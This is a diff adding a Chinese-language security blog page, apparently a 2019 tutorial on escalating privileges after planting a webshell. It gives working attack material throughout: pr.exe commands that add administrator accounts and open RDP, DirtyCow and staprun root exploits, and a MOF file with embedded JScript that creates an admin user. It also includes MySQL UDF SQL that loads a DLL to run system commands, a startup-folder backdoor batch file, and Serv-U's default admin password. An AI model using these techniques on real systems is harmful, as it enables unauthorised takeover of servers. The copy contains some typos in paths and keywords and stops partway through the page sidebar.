@@ -1,0 +1,441 @@
+<!DOCTYPE html>
+<html>
+  <head><meta name="generator" content="Hexo 3.8.0">
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="theme-color" content="#33363b">
+    <meta name="msapplication-TileColor" content="#33363b">
+    
+    
+    
+    
+    <meta name="keywords" content="Life, ARIA, Hexo">
+    
+    
+    <link rel="apple-touch-icon" sizes="180x180" href="/favicons/apple-touch-icon.png">
+    
+    
+    <link rel="icon" type="image/png" sizes="192x192" href="/favicons/android-chrome-192x192.png">
+    
+    
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicons/favicon-32x32.png">
+    
+    
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicons/favicon-16x16.png">
+    
+    
+    <link rel="mask-icon" href="/favicons/safari-pinned-tab.svg" color="#33363b">
+    
+    
+    <link rel="manifest" href="/favicons/site.webmanifest">
+    
+    
+    <meta name="msapplication-config" content="/favicons/browserconfig.xml">
+    
+    
+    <link rel="alternate" href="/atom.xml" title="TuringGu" type="application/atom+xml">
+    
+    
+    <link rel="shortcut icon" type="image/x-icon" href="/favicons/favicon.ico">
+    
+    
+    <link rel="stylesheet" type="text/css" href="/css/normalize.css">
+    <link rel="stylesheet" type="text/css" href="/css/index.css">
+    
+    <link rel="stylesheet" type="text/css" href="/css/sidebar.css">
+    
+    
+<link rel="stylesheet" type="text/css" href="/css/page.css">
+<link rel="stylesheet" type="text/css" href="/css/post.css">
+
+    <link rel="stylesheet" type="text/css" href="/css/custom.css">
+    <link rel="stylesheet" type="text/css" href="/css/atom-one-dark.css">
+    <link rel="stylesheet" type="text/css" href="/css/lightgallery.min.css">
+    <script type="text/javascript" src="/js/jquery.min.js"></script>
+    <script defer type="text/javascript" src="/js/util.js"></script>
+    <script defer type="text/javascript" src="/js/scrollspy.js"></script>
+    <script defer type="text/javascript" src="/js/fontawesome-all.min.js"></script>
+    <script defer type="text/javascript" src="/js/lightgallery.min.js"></script>
+    <script defer type="text/javascript" src="/js/lg-fullscreen.min.js"></script>
+    <script defer type="text/javascript" src="/js/lg-hash.min.js"></script>
+    <script defer type="text/javascript" src="/js/lg-pager.min.js"></script>
+    <script defer type="text/javascript" src="/js/lg-thumbnail.min.js"></script>
+    <script defer type="text/javascript" src="/js/lg-zoom.min.js"></script>
+    
+    <script defer src="/js/busuanzi.pure.mini.js"></script>
+    
+    
+    <script defer type="text/javascript" src="/js/search.js"></script>
+    <script type="text/javascript">
+    $(document).ready(function () {
+      var searchPath = "search.xml";
+      if (searchPath.length === 0) {
+        searchPath = "search.xml";
+      }
+      var path = "/" + searchPath;
+      searchFunc(path, "search-input", "search-result");
+    });
+    </script>
+    
+    
+    <script defer type="text/javascript" src="/js/index.js"></script>
+    
+    <script defer type="text/javascript" src="/js/custom.js"></script>
+    <title>权限提升 | TuringGu - Info Security</title>
+  </head>
+  <body itemscope="" itemtype="http://schema.org/WebPage" lang="zh_CN" data-spy="scroll" data-target=".list-group">
+    
+<header id="header" class="header" style="background: #33363b;">
+  <div class="container">
+    <div class="header-container">
+      <div class="header-title">
+        <h1 class="title"><a href="/">TuringGu</a></h1>
+        <h2 class="subtitle">Info Security</h2>
+      </div>
+      
+      <div class="logo">
+        <img src="/images/logo.png" alt="logo">
+      </div>
+      
+    </div>
+    <nav id="nav" class="nav">
+      <a id="nav-toggle" class="nav-toggle" aria-hidden="true"><i class="fas fa-bars" aria-label="切换导航栏"></i></a>
+      <ul id="menu" role="menubar" aria-hidden="false">
+        
+        <li role="menuitem"><a href="/">首页</a></li>
+        
+        <li role="menuitem"><a href="/archives/">归档</a></li>
+        
+        <li role="menuitem"><a href="/categories/">分类</a></li>
+        
+        <li role="menuitem"><a href="/tags/">标签</a></li>
+        
+        <li role="menuitem"><a href="/about/">关于</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</header>
+
+
+    <main id="main" class="main">
+      <div class="container">
+        <div class="main-container">
+          <div class="content">
+            
+<div id="post" class="page">
+  
+  <article class="article post card animate" itemscope="" itemtype="http://schema.org/Article">
+    <div class="post-block">
+      <link itemprop="mainEntityOfPage" href="https://TuringGu.github.io/2019/02/18/Privilege-elevation/">
+      <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+       <meta itemprop="name" content="TuringGu">
+       <meta itemprop="description" content="">
+       <meta itemprop="image" content="/images/myavatar.jpg">
+      </span>
+      <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+       <meta itemprop="name" content="TuringGu">
+      </span>
+    </div>
+    <header class="post-header">
+      <h1 class="post-title" itemprop="name headline">权限提升</h1>
+      <div class="post-meta">
+        
+        <span class="post-date">
+          <i class="far fa-calendar-plus"></i><span><time title="post-date" itemprop="dateCreated datePublished" datetime="2019-02-18T20:27:53+08:00">2019-02-18 20:27:53</time></span>
+        </span>
+        
+        
+        
+      </div>
+    </header>
+    <main class="post-main" itemprop="articleBody">
+      <h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><h3 id="提权目的"><a href="#提权目的" class="headerlink" title="提权目的"></a>提权目的</h3><blockquote>
+<p>有时，通过某些方式（例如上传Webshell）获取执行命令的shell，但是会因为权限限制而无法执行某些命令。此时为了“扩大战果”，需要利用提权，使得原本的低权限（如只允许列目录）提升为高权限（如拥有修改文件的能力）</p>
+</blockquote>
+<hr>
+<h2 id="系统漏洞提权"><a href="#系统漏洞提权" class="headerlink" title="系统漏洞提权"></a>系统漏洞提权</h2><h3 id="本地提权"><a href="#本地提权" class="headerlink" title="本地提权"></a>本地提权</h3><h4 id="种类"><a href="#种类" class="headerlink" title="种类"></a>种类</h4><ul>
+<li>本地服务提权漏洞<blockquote>
+<ul>
+<li>iis6、iis5（ms09-020）</li>
+<li>ftp（需要本身的ftp服务权限就很高，ftp，serv-u ftp，g6ftp等）</li>
+<li>smb（MS17-010） 在msf框架下成功率很好，可以正常放回cmdshell</li>
+<li>rpc（ms08-067）</li>
+</ul>
+</blockquote>
+</li>
+<li>系统内核提权漏洞</li>
+</ul>
+<hr>
+<h4 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h4><p>收集补丁信息<br><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">systeminfo  <span class="hljs-comment"># 可重点查看系统所打补丁</span><br></code></pre></td></tr></table></figure></p>
+<p><a href="https://docs.microsoft.com/zh-cn/security-updates/index" target="_blank" rel="noopener"><strong><code>微软安全通报和公告</code></strong></a></p>
+<h4 id="不能执行命令原因"><a href="#不能执行命令原因" class="headerlink" title="不能执行命令原因"></a>不能执行命令原因</h4><ol>
+<li>权限不够</li>
+<li><code>cmd</code>等（<code>/bin/bash</code>）被禁用</li>
+</ol>
+<p>连接webshell，发现命令不能执行，考虑可能禁用了<code>cmd</code>(或<code>c:\windows\system32</code>无权限)，上传<code>cmd.exe</code>到web根目录，通过cmd.exe执行命令发现可以执行，考虑添加用户，开启<code>3389</code>，进行远程登录<br>添加用户时发现权限不够，查看权限发现是network服务内核权限，不是管理员权限，考虑提权，根据系统版本，使用<code>pr.exe</code>提权<br>执行添加用户，把用户添加到管理员组，开启3389服务<br>提权成功，登录</p>
+<p>使用上传的cmd.exe打开虚拟终端<br>查看端口：<br><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">netstat -ano<br></code></pre></td></tr></table></figure></p>
+<p>开启3389端口：<br><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">pr.exe <span class="hljs-string">"regedit /s 3389.reg"</span><br><span class="hljs-comment"># 或者：</span><br>pr.exe <span class="hljs-string">"3389.bat"</span><br></code></pre></td></tr></table></figure></p>
+<p>添加用户并加入administrators组<br><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">pr.exe <span class="hljs-string">"user test test /add"</span><br>pr.exe <span class="hljs-string">"net localgroup administrators test /add"</span><br></code></pre></td></tr></table></figure></p>
+<p>或者修改管理员密码<br><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">pr.exe <span class="hljs-string">"net user administrator test"</span><br></code></pre></td></tr></table></figure></p>
+<p>cmd命令<br><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs undefined">net user /?<br>net group /?<br></code></pre></td></tr></table></figure></p>
+<hr>
+<h4 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h4><p>判断系统版本<br><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">uname -a  <span class="hljs-comment"># 查看操作系统内核信息</span><br>cat /proc/version  <span class="hljs-comment"># 查看当前操作系统版本信息</span><br>cat /etc/issur  <span class="hljs-comment"># 查看你版本当前操作系统发行版信息</span><br>cat /etc/redhat-release<br></code></pre></td></tr></table></figure></p>
+<p>判断出内核版本之后，就去找exp（通常是脏牛），然后上传并编译执行<br>上传编译<br><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">gcc exp.c -o exp  <span class="hljs-comment"># 或者有需要加编译选项：例如脏牛漏洞的</span><br>gcc -pthread dirty.c -o dirty -lcrypt<br></code></pre></td></tr></table></figure></p>
+<p><strong>tip</strong><br>适用于linux系统、安卓系统、大多数嵌入式系统<br><code>DirtyCow</code>（脏牛，条件竞争漏洞）<br>Cow(Copy On Write)</p>
+<p>脏牛漏洞eg:<br>dirtyc0w.c<br><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> this is a <span class="hljs-built_in">test</span> &gt; foo<br>chmod 404 foo<br>cat foo<br>gcc -pthread dirtyc0w.c -o dirtyc0w<br>./dirtyc0w foo m00000000<br>cat foo<br></code></pre></td></tr></table></figure></p>
+<hr>
+<h5 id="一句话提权"><a href="#一句话提权" class="headerlink" title="一句话提权"></a>一句话提权</h5><p>受影响版本：<code>RedHat Centos  debian  linux&lt;2.6.18-194</code><br>须在bash环境执行<br><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">printf</span> <span class="hljs-string">"install uprobes /bin/sh"</span> &gt; exploit.conf;MODPROBE_OPTIONS=<span class="hljs-string">"-C exploit.conf"</span> staprun -u whatever<br></code></pre></td></tr></table></figure></p>
+<hr>
+<h2 id="数据库提权"><a href="#数据库提权" class="headerlink" title="数据库提权"></a>数据库提权</h2><p>###<br>原理：</p>
+<ol>
+<li>具有mysql的root权限，且mysql以system权限运行</li>
+<li>具有执行sql语句的权限，webshell或者外连均可</li>
+</ol>
+<h3 id="MOF提权"><a href="#MOF提权" class="headerlink" title="MOF提权"></a>MOF提权</h3><h4 id="提权原理："><a href="#提权原理：" class="headerlink" title="提权原理："></a>提权原理：</h4><blockquote>
+<p>mof是windows系统的一个文件（在<code>c:/windows/system32/wbem/mof/nullevt.mof</code>）叫做“托管对象格式”，其作用是每隔五秒就回去监控进程创建和死亡。其利用了mysql的root权限以后，然后使用root权限去执行上传的mof。隔了一定时间后，这个mof就会被执行，此mof当中有一段是vbs脚本，大多数时候是cmd的添加管理员用户的命令<br>mof文件通过Mofcomp.exe编译执行</p>
+</blockquote>
+<hr>
+<h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><figure class="hljs highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> namespace(<span class="hljs-meta-string">"\\\\.\\root\\subscription"</span>)</span><br><br>instance of __EventFilter as $EventFilter &#123;<br>	EventNamespace = <span class="hljs-string">"Root\\Cimv2"</span>;<br>	Name = <span class="hljs-string">"filtP2"</span>;<br>	Query = <span class="hljs-string">"Select * From __InstanceModificationEvent Where TargetInstance Isa \"Win32_LocalTime\" And Target Instance.Second = 5"</span>;<br>	QueryLanguage = <span class="hljs-string">"WQL"</span>;<br>&#125;;<br><br>instance of ActiveScriptEventConsumer as $Consumer &#123;<br>	Name = <span class="hljs-string">"consPCSV2"</span>;<br>	ScriptingEngine = <span class="hljs-string">"JScript"</span>;<br>	ScriptText = <span class="hljs-string">"var WSH = new ActiveXObject(\"WScript.Shell\")\nWSH.run(\"net.exe user admin admin /add\")"</span>;<br>&#125;;<br><br>instance of __FilterToConsumerBinding &#123;<br>	Consumer = $Consumer;<br>	Filter = $EventFilter;<br>&#125;<br></code></pre></td></tr></table></figure>
+<hr>
+<h4 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h4><p>下列方法仅适用于windows系统</p>
+<ol>
+<li>首先找个可写的目录，将MOF文件上传上去</li>
+<li>执行以下sql语句，mof文件内的命令便会执行<figure class="hljs highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-keyword">load_file</span>(<span class="hljs-string">'C:/wmpub/nullevt.mof'</span>) <span class="hljs-keyword">into</span> <span class="hljs-keyword">dumpfile</span> <span class="hljs-string">'c:/windows/system32/webem/mof/nullevt.mof'</span><br></code></pre></td></tr></table></figure>
+</li>
+</ol>
+<hr>
+<h3 id="开机启动项提权"><a href="#开机启动项提权" class="headerlink" title="开机启动项提权"></a>开机启动项提权</h3><h4 id="思路："><a href="#思路：" class="headerlink" title="思路："></a>思路：</h4><p>利用mysql，将后门写入开机自启动项。同时因为开机自启动，在写入之后，需要重启目标服务器（此操作至少是管理员权限）</p>
+<h4 id="利用方法-1"><a href="#利用方法-1" class="headerlink" title="利用方法"></a>利用方法</h4><p>自启路径：<br><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs undefined"># 在此目录下写一个批处理文件(.bat)<br>C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup<br><br># 或者windows2003及xp路径<br>C：\Documents and Settings\Administrator\[开始]菜单\程序\启动\<br></code></pre></td></tr></table></figure></p>
+<p>写入文件eg：<br>hack.bat<br><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">net user <span class="hljs-built_in">test</span> <span class="hljs-built_in">test</span> /add<br>net localgroup Administrators <span class="hljs-built_in">test</span> /add<br></code></pre></td></tr></table></figure></p>
+<hr>
+<h3 id="UDF提权"><a href="#UDF提权" class="headerlink" title="UDF提权"></a>UDF提权</h3><blockquote>
+<p>UDF(User Defined Function)用户自定义函数，是mysql的一个拓展接口，是拓展其的技术手段</p>
+</blockquote>
+<h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><ul>
+<li>UDF可以理解为MySQL的函数库，可以利用UDF定义创建函数。（其中包括了执行系统命令的函数）</li>
+<li>若要利用UDF，需要上传<code>udf.dll</code>作为UDF的执行库</li>
+<li>mysql中支持UDF扩展，使得可以调用DLL里面的函数来实现一些特殊的功能</li>
+</ul>
+<hr>
+<h4 id="流程概述"><a href="#流程概述" class="headerlink" title="流程概述"></a>流程概述</h4><ul>
+<li>得到插件库路径</li>
+<li>找对应操作系统的udf库文件</li>
+<li>利用udf库文件加载函数并执行命令</li>
+</ul>
+<hr>
+<h4 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h4><p>判断mysql版本<br>version &lt; 5.1，UDF导出到系统目录：<br><code>C:/windows/system32/udf.dll</code><br>version &gt;= 5.1，UDF导出到：<br><code>安装路径MySQL/Lib/Plugin/udf.dll</code></p>
+<p>可以在mysql里输入：<br><figure class="hljs highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-comment"># 查找mysql安装路径</span><br><span class="hljs-keyword">select</span> @@basedir<br><span class="hljs-keyword">show</span> <span class="hljs-keyword">variables</span> <span class="hljs-keyword">like</span> <span class="hljs-string">'%plugins%'</span><br></code></pre></td></tr></table></figure></p>
+<p>该目录默认不存在，需要使用Webshell找到mysql安装目录，并在安装目录下创建<code>\lib\plugin</code>文件夹，然后将udf.dll文件导出到该目录</p>
+<hr>
+<h4 id="利用流程"><a href="#利用流程" class="headerlink" title="利用流程"></a>利用流程</h4><ul>
+<li><p>导出DLL</p>
+<figure class="hljs highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> a (cmd LONGBLOB);<br><span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> a (cmd) <span class="hljs-keyword">values</span> (<span class="hljs-keyword">hex</span>(<span class="hljs-keyword">load_file</span>(<span class="hljs-string">'D:\\Program Files\\MySQL\\MySQL Server 5.0\\Lib\\Plugin\\lib_mysqludf_sys.dll'</span>)));<br><span class="hljs-keyword">select</span> <span class="hljs-keyword">unhex</span>(cmd) <span class="hljs-keyword">from</span> a <span class="hljs-keyword">into</span> <span class="hljs-keyword">DUMPFILE</span> <span class="hljs-string">'c:\\windows\\system32\\udf.dll'</span>;<br><span class="hljs-keyword">create</span> <span class="hljs-keyword">function</span> sys_eval <span class="hljs-keyword">returns</span> <span class="hljs-keyword">string</span> <span class="hljs-keyword">soname</span> <span class="hljs-string">'udf.dll'</span>;<br><span class="hljs-keyword">select</span> sys_eval(<span class="hljs-string">'ipconfig'</span>);<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>创建用户自定义函数</p>
+<figure class="hljs highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">create</span> <span class="hljs-keyword">function</span> cmdshell <span class="hljs-keyword">returns</span> <span class="hljs-keyword">string</span> <span class="hljs-keyword">soname</span> <span class="hljs-string">'udf.dll'</span>;<br><span class="hljs-keyword">select</span> cmdshell(<span class="hljs-string">'net user waitalone waitalone.cn /add'</span>);<br><span class="hljs-keyword">select</span> cmdshell(<span class="hljs-string">'net localgroup administrators waitalone /add'</span>);<br><span class="hljs-keyword">drop</span> <span class="hljs-keyword">function</span> cmdshell;<br>delect from mysql.func where name='cmdshell';<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>利用</p>
+<figure class="hljs highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> cmdshell(<span class="hljs-string">'cmd'</span>,<span class="hljs-string">'ipconfig'</span>);<br></code></pre></td></tr></table></figure>
+</li>
+</ul>
+<hr>
+<h3 id="直接外连提权"><a href="#直接外连提权" class="headerlink" title="直接外连提权"></a>直接外连提权</h3><p>MySQL开启对外连接，任意外网用户能够直接登陆，通过执行mysql语句进行提权<br>其原理就是udf提权，适用于windows和linux</p>
+<hr>
+<h2 id="MSSQL提权"><a href="#MSSQL提权" class="headerlink" title="MSSQL提权"></a>MSSQL提权</h2><h3 id="利用sa用户"><a href="#利用sa用户" class="headerlink" title="利用sa用户"></a>利用sa用户</h3><h4 id="利用前提"><a href="#利用前提" class="headerlink" title="利用前提"></a>利用前提</h4><p>所谓利用数据进行提权，即利用数据库的运行权限，因此需要满足以下条件：</p>
+<ol>
+<li>必须获得<code>sa</code>的账号密码或者<code>sa</code>相同权限的账号密码，且mssql没有被降权</li>
+<li>必须可以以某种方式执行sql语句，如：webshell或者1433端口的连接</li>
+</ol>
+<p>PS:能够通过配置文件找到系统的登录账户密码</p>
+<hr>
+<h4 id="提权思路"><a href="#提权思路" class="headerlink" title="提权思路"></a>提权思路</h4><ol>
+<li>MSSQL在Windows Server类操作系统上，默认具有system权限。system权限在windows server 2003中权限仅比管理员小，而在2003以上版本，则为最高权限</li>
+<li>获取webshell之后可尝试在服务器各个站点目录寻找sa的密码（某些站点可直接在web应用程序中使用sa连接数据库），一般情况下，net的站点数据库连接字符串在<code>web.config</code>或者和<code>global.aspx</code>也有可能是编译在DLL文件当中</li>
+<li>通过端口扫描查看1433（mssql默认端口）是否对外开放。若对外开放则使用sql连接器进行提权；若没有对外开放，则使用webshell自带的mssql数据库连接功能连接至mssql数据库</li>
+<li><code>sa</code>作为mssql默认最高权限的账户，在正常情况下，可通过xp cmdshell等方式执行系统命令</li>
+</ol>
+<hr>
+<h2 id="利用服务器的第三方组件提权"><a href="#利用服务器的第三方组件提权" class="headerlink" title="利用服务器的第三方组件提权"></a>利用服务器的第三方组件提权</h2><h3 id="Pcanywhere"><a href="#Pcanywhere" class="headerlink" title="Pcanywhere"></a>Pcanywhere</h3><p>赛门铁克公司出品的一款可远程连接到服务器的远程桌面工具</p>
+<h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>pcanywhere与windows自带的mstsc（远程桌面）不同之处在于，pcanywhere不适用windows操作系统的用户密码进行盐哼，而是使用自身建立的用户密码进行验证<br>如此，只要获得pcanywhere的登陆密码，即可获取服务器的远程桌面</p>
+<p>密码文件存储位置：<br><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">C:\Documents and Settings\All Users\Application Data\Symantec\pcAnywhere\pcanywherepwd<br></code></pre></td></tr></table></figure></p>
+<hr>
+<h3 id="Serv-U"><a href="#Serv-U" class="headerlink" title="Serv-U"></a>Serv-U</h3><p>Serv-U是使用Serv-u本地默认管理端口，以默认管理员登陆新建域和用户来执行命令<br>Serv-u &gt; 3.x版本默认配置：<br>本地管理端口：<code>43958</code><br>管理员：<code>LocalAdministrator</code><br>密码：<code>#|@$ak#.|k;0@P;</code><br>这是集成在Serv-u内部的，可以以<code>Guest</code>权限来进行连接，对其进行管理</p>
+<p>通过连接Serv-U然后执行操作系统命令的方式来添加具有管理权限的账户<br>现在的Webshell很多都会自带Serv-U提权功能，只需输入要执行的命令即可</p>
+<hr>
+<h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><h3 id="总结一些经验"><a href="#总结一些经验" class="headerlink" title="总结一些经验"></a>总结一些经验</h3><p>拿到webshell</p>
+<ul>
+<li>win<br><code>whoami</code>判断权限，直接system就不用提权，jsp站直接system权限<br>systeminfo查看补丁信息和操作系统版本<br>上传exp，找可写目录<br>执行，若无法通过系统漏洞或系统服务漏洞提权，下一步翻目录<br>重点关注，config配置文件，比如数据库连接文件，pcanywhere的密码文件等等一些第三方软件的敏感文件<br>PS：一个服务器有<code>aspx</code>，<code>php</code>，<code>jsp</code>，拿下来一个aspx的低权限shell，翻目录发现jsp网站的目录，向jsp目录传一个webshell，然后访问jspshell，可能会有最高去权限</li>
+</ul>
+<hr>
+<ul>
+<li>linux<br>whoami判断权限，如果直接root权限就无需提权，在<code>weglogic</code>，<code>tomcat</code>，<code>jboss</code>等等一些jsp中间件出现比较多<br>查找系统版本<code>uname -a</code>，<code>cat /proc/version</code> 等等<br>接着去 <a href="http://www.exploit-db.com" target="_blank" rel="noopener">www.exploit-db.com</a> 查找对应内核版本的exp，上传<br>上传之后<code>gcc exp.c -o exp</code>若有需要需加编译参数，根据exp的注释说明来写。若服务器没有gcc，则在本地搭建一个同版本的系统，然后把exp在本地编译之后再上传<br>若exp无法提权，翻目录，linux敏感目录和文件有哪些（百度），比如：老版本linux的<code>/etc/passwd</code>存储了密码和账号，数据库配置文件等等</li>
+</ul>
+
+    </main>
+    <footer class="post-footer">
+      
+      <div class="post-tags">
+        
+        <a class="post-tag button" href="/tags/Privilege/" rel="tag"><i class="fas fa-tags"></i>Privilege</a>
+        
+        <a class="post-tag button" href="/tags/Elevation/" rel="tag"><i class="fas fa-tags"></i>Elevation</a>
+        
+      </div>
+      
+    </footer>
+  </article>
+  
+  
+<div class="reward" id="reward">
+  <p>您的支持是我前进的动力！</p>
+  <button id="reward-button" class="button" disable="enable">打赏</button>
+  <div id="qr" class="qr" style="display: none;" aria-hidden="true">
+    
+    
+    
+  </div>
+</div>
+
+
+  
+  
+  <nav class="page-nav">
+    <div class="page-nav-next page-nav-item">
+      
+      <a href="/2019/01/28/Business-logic-hole/" rel="next" title="业务逻辑漏洞"><i class="fas fa-angle-left"></i><span class="nav-title">业务逻辑漏洞</span></a>
+      
+    </div>
+    <div class="page-nav-prev page-nav-item">
+      
+      <a href="/2019/02/20/Privilege-persistence/" rel="prev" title="权限维持"><span class="nav-title">权限维持</span><i class="fas fa-angle-right"></i></a>
+      
+    </div>
+  </nav>
+  
+  
+</div>
+
+          </div>
+          
+          
+          
+<aside class="sidebar" id="sidebar" style="background: url(/images/background.png);">
+  
+  <div class="search">
+    <div class="form-group">
+      <i class="fas fa-search"></i><input type="search" id="search-input" name="q" results="0" placeholder="搜索" class="form-control">
+    </div>
+  </div>
+  <div class="search-result-box" id="search-result"></div>
+  
+  
+<div class="info sidebar-item" id="info">
+  
+  <img class="author-avatar" src="/images/myavatar.jpg" alt="TuringGu">
+  
+  <h1 class="author-name">TuringGu</h1>
+  <h2 class="author-description"></h2>
+  <div class="site-count">
+    
+    <div class="archives-count">
+      <div class="site-count-title">归档</div>
+      <div><a href="/archives/">38</a></div>
+    </div>
+    
+    
+    
+    <span class="site-count-divider divider">|</span>
+    
+    <div class="categories-count">
+      <div class="site-count-title">分类</div>
+      <div><a href="/categories/">0</a></div>
+    </div>
+    
+    
+    
+    <span class="site-count-divider divider">|</span>
+    
+    <div class="tags-count">
+      <div class="site-count-title">标签</div>
+      <div><a href="/tags/">73</a></div>
+    </div>
+    
+  </div>
+  
+  <div class="rss">
+    <a class="rss-link button sidebar-item" href="/atom.xml"><i class="fas fa-rss"></i>RSS</a>
+  </div>
+  
+</div>
+
+
+  <div class="sidebar-sticky">
+    
+    
+    
+    
+    
+    <hr>
+    <div class="post-toc sidebar-item" id="toc-div">
+      <div><i class="fas fa-list-ol"></i>文章目录</div>
+      <div class="post-toc-content"><ol class="list-group toc"><li class="toc-item toc-level-2"><a class="list-group-item toc-link" href="#简介"><span class="toc-text">简介</span></a><ol class="list-group toc-child"><li class="toc-item toc-level-3"><a class="list-group-item toc-link" href="#提权目的"><span class="toc-text">提权目的</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="list-group-item toc-link" href="#系统漏洞提权"><span class="toc-text">系统漏洞提权</span></a><ol class="list-group toc-child"><li class="toc-item toc-level-3"><a class="list-group-item toc-link" href="#本地提权"><span class="toc-text">本地提权</span></a><ol class="list-group toc-child"><li class="toc-item toc-level-4"><a class="list-group-item toc-link" href="#种类"><span class="toc-text">种类</span></a></li><li class="toc-item toc-level-4"><a class="list-group-item toc-link" href="#Windows"><span class="toc-text">Windows</span></a></li><li class="toc-item toc-level-4"><a class="list-group-item toc-link" href="#不能执行命令原因"><span class="toc-text">不能执行命令原因</span></a></li><li class="toc-item toc-level-4"><a class="list-group-item toc-link" href="#Linux"><span class="toc-text">Linux</span></a><ol class="list-group toc-child"><li class="toc-item toc-level-5"><a class="list-group-item toc-link" href="#一句话提权"><span class="toc-text">一句话提权</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="list-group-item toc-link" href="#数据库提权"><span class="toc-text">数据库提权</span></a><ol class="list-group toc-child"><li class="toc-item toc-level-3"><a class="list-group-item toc-link" href="#MOF提权"><span class="toc-text">MOF提权</span></a><ol class="list-group toc-child"><li class="toc-item toc-level-4"><a class="list-group-item toc-link" href="#提权原理："><span class="toc-text">提权原理：</span></a></li><li class="toc-item toc-level-4"><a class="list-group-item toc-link" href="#代码"><span class="toc-text">代码</span></a></li><li class="toc-item toc-level-4"><a class="list-group-item toc-link" href="#利用方法"><span class="toc-text">利用方法</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="list-group-item toc-link" href="#开机启动项提权"><span class="toc-text">开机启动项提权</span></a><ol class="list-group toc-child"><li class="toc-item toc-level-4"><a class="list-group-item toc-link" href="#思路："><span class="toc-text">思路：</span></a></li><li class="toc-item toc-level-4"><a class="list-group-item toc-link" href="#利用方法-1"><span class="toc-text">利用方法</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="list-group-item toc-link" href="#UDF提权"><span class="toc-text">UDF提权</span></a><ol class="list-group toc-child"><li class="toc-item toc-level-4"><a class="list-group-item toc-link" href="#原理"><span 